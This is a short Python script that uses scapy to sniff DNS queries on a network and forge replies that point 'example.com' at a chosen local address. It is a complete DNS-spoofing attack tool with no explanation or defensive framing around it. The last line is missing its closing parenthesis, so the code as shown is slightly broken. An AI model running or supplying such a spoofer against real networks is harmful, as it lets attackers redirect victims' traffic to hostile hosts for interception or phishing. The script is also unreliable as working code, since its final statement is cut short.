from scapy.all import sniff, IP, UDP, DNS, DNSQR, DNSRR, send

def dns_spoof(packet):
    if packet.haslayer(DNSQR) and b"example.com" in packet[DNSQR].qname:
        fake_ip = "192.168.1.100"
        spoofed_pkt = IP(dst=packet[IP].src, src=packet[IP].dst) / \
                      UDP(dport=packet[UDP].sport, sport=53) / \
                      DNS(id=packet[DNS].id, qr=1, aa=1, qd=packet[DNSQR], 
                          an=DNSRR(rrname=packet[DNSQR].qname, rdata=fake_ip))
        send(spoofed_pkt, verbose=False)
        print(f"[INFO] Spoofed DNS response for {packet[DNSQR].qname.decode()} -> {fake_ip}")

print("[INFO] Listening for DNS requests...")
sniff(filter="udp port 53", prn=dns_spoof, store=False
